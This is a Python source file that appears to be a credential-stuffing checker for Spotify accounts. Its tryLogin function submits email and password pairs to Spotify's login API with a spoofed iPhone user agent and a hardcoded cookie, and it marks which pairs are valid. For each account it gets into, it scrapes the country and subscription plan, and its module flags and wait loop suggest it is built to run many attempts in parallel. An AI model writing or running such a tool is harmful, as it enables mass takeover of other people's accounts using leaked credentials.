import requests
import time
import json

firstlogin = True
dontRun = False
waitingInit = True
s = requests.session()

def loadForm():
	global s
	global dontRun
	headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1"}
	loginform = s.get("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F", headers=headers).text
	if "Spotify</title>" not in loginform:
		raise Exception("Can't load login form, please stop and run the script again")
		dontRun = True
		exit()


def tryLogin(data, proxy):
	global firstlogin
	global s
	global waitingInit
	if firstlogin:
		firstlogin = False
		loadForm()
		waitingInit = False

	while waitingInit:
		time.sleep(0.3)

	email, password = data

	headers2 = {
	        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
	        "Content-Type": "application/x-www-form-urlencoded",
	        "Accept": "application/json, text/plain, */*"
	}
	data = {"remember":"true", "username": email, "password": password, "csrf_token": s.cookies.get_dict()["csrf_token"]}
	result = s.post("https://accounts.spotify.com/api/login", headers=headers2, cookies={"__bon":"MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx"}, data=data)
	if "displayName" not in result.text:
		if "errorInvalidCredentials" not in result.text:
			raise Exception(result.text)
		else:
			return (False,)

	headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1"}
	home = s.get("https://www.spotify.com/us/account/overview/", headers=headers)
	country = home.text.split('"Country","value":"')[1].split('"')[0]
	acctype = home.text.split('"plan":{"name":"')[1].split('"')[0]
	return (True, ("Country: " + country + ", Account Type: " + acctype))
